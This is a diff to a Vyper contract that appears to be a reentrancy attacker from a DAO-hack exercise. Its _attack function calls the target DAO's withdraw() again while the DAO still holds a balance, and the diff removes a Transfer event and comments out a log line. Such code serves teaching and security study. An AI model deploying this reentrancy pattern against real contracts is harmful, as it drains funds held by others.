@@ -6,11 +6,6 @@ interface DAO:
 dao_address: public(address)
 owner_address: public(address)
 
-event Transfer:
-    sender: indexed(address)
-    receiver: indexed(address)
-    value: uint256
-
 @external
 def __init__():
     self.dao_address = ZERO_ADDRESS
@@ -24,7 +19,7 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     if self.dao_address.balance > 0:
         DAO(self.dao_address).withdraw()
-    log Transfer((msg.sender, self.dao_address, self.dao_address.balance)
+    #log Transfer((msg.sender, self.dao_address, self.dao_address.balance)
     return True
 
 @external
